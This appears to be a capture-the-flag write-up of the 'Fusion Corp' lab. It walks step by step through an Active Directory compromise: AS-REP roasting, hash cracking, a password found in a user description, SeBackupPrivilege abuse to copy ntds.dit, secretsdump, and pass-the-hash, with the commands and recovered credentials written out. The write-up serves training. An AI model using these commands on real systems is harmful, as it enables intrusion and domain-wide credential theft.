# Fusion Corp

Active Directory

# **Enumeration**

## **nmap**

```php
sudo nmap -sS -sV -sC -T4 -n -Pn -p- 10.80.139.122 -oN 'nmap_full'
```

![1.png](Images/Fusion%20Corp/1.png)

**From The Scan I knew that i am dealing with DC in AD Environment The Name of the domain is fusion.corp and the DC is FUSION-DC.fusion.corp so i added it to my /etc/hosts file**

## **HTTP 80**

**Since There is a lot of ports open lets start with our enumeration from the HTTP 80 So it maybe reveal anything interesting.**

**Firstly i opened the webpage and i found 4 names so i noted them for later use maybe.**

![2.png](Images/Fusion%20Corp/2.png)

## **Directory Fuzzing**

```php
feroxbuster -u <http://10.80.139.122/> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x php,asp,aspx,jsp,html,htm,js,txt,bak,old,zip,tar,gz,conf,log,py,db -t 40 -k --output dirs.json
```

**Honestly I got a lot of results but nothing was interesting more than the backup directory i found.**

![3.png](Images/Fusion%20Corp/3.png)

**Lets visit it.**

![4.png](Images/Fusion%20Corp/4.png)

**I Downloaded the file**

![5.png](Images/Fusion%20Corp/5.png)

**Nice It looks like we Found a list of usernames Lets note them and try to check which is valid and ASREP-Roastable**

# **Foot Hold**

```php
impacket-GetNPUsers fusion.corp/ -dc-ip 10.80.139.122 -usersfile users.txt -format john -outputfile hashes.txt -no-pass -request
```

![6.png](Images/Fusion%20Corp/6.png)

**Nice We Found a user called lparker and we got also his hash so lets crack it**

```php
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

![7.png](Images/Fusion%20Corp/7.png)

Now i have username and password to start in the AD **lparker** : **!!abbylvzsvs2k6!**

**Lets Try Evil-winrm to login to the machine**

```php
evil-winrm -i 10.80.139.122 -u lparker -p '!!abbylvzsvs2k6!'
```

![8.png](Images/Fusion%20Corp/8.png)

I logged in successfully and i found that beside my user and administrator there is another username called **jmurphy** so i will note it for later user.

# **AD Enumeration**

Now Since i have a valid username and password joined the domain lets use bloodhound to enumerate the AD and find our path to take the control of the environment.

Lets first collect the data by **Rusthound**

```php
rusthound -d fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!' -i 10.80.139.122 --zip -o fusion.corp.zip
```

![9.png](Images/Fusion%20Corp/9.png)

Now Lets analyze via Blood Hound .

**Our first user has nothing to do in the AD so it’s use is only to enumerate further.**

![10.png](Images/Fusion%20Corp/10.png)

**Let’s Check the jmurphy that we found and see what he can do.**

![11.png](Images/Fusion%20Corp/11.png)

**this is a big mistake to put the password in the description xD**

Now lets note the username and the password first

**jmurphy** : **u8WC3!kLsgw=#bRY**

Also i Found that this user is a member of the Backup operators which is perfect to dumb the 

SAM / NTDS.DIT and extract the hashes from it.

![12.png](Images/Fusion%20Corp/12.png)

# **Lateral Movement**

Now since we got another easy valuable Username and Password lets move further and take full control of the AD.

Lets first login with the new user we got via Evil-Winrm

![13.png](Images/Fusion%20Corp/13.png)

Now Since We have the **SeBackupPrivilege** We can dump the ntds.dit easily.

**I know a tool that copies the Hives and files easily without any problem so lets transfer it to the Windows machine.**

![14.png](Images/Fusion%20Corp/14.png)

Now We have the tool so lets move on

```php
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```

**Now My objective it to dump the ntds.dit / SYSTEM Then Download them and extract the hashes then crack it offline.**

**Now lets use my lovely script The script tells DiskShadow to make a shadow copy of C: and expose it as a drive.**

![15.png](Images/Fusion%20Corp/15.png)

- `set metadata …` → where to store metadata
- `set context persistent nowriters` → stable snapshot, ignore writers
- `add volume c: alias new` → target volume
- `create` → make the shadow copy
- `expose %new% z:\` → mount it as drive Z:

So in one short: it creates a VSS snapshot of C: and mounts it for you to read files like `ntds.dit`

Let’s Upload it and use it

**Executing the script:**

```php
diskshadow.exe /s .\\shadow.txt
```

**Copying the ntds.dit and SYSTEM:**

```php
Copy-FileSeBackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\Users\\jmurphy\\ntds.dit
```

```php
reg save HKLM\\SYSTEM C:\\Users\\jmurphy\\SYSTEM
```

![16.png](Images/Fusion%20Corp/16.png)

**Download the files for offline dumping and cracking.**

![17.png](Images/Fusion%20Corp/17.png)

**Extract the hashes**

```php
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

![18.png](Images/Fusion%20Corp/18.png)

Now Since We have the all these hashes we can perform many attacks and move further but for the seek of the room i only going to use the Administrator’s hash and perform the Pass-The-Hash Attack and Extract the 3 Flags from the machine.

```php
evil-winrm -i 10.80.153.189 -u administrator -H '9653b02d945329c7270525c4c2a69c67'
```

![19.png](Images/Fusion%20Corp/19.png)

**Let’s Search for the for the flags in the SYSTEM**

```php
Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -ErrorAction SilentlyContinue
```

![20.png](Images/Fusion%20Corp/20.png)

# **Flags**

![21.png](Images/Fusion%20Corp/21.png)
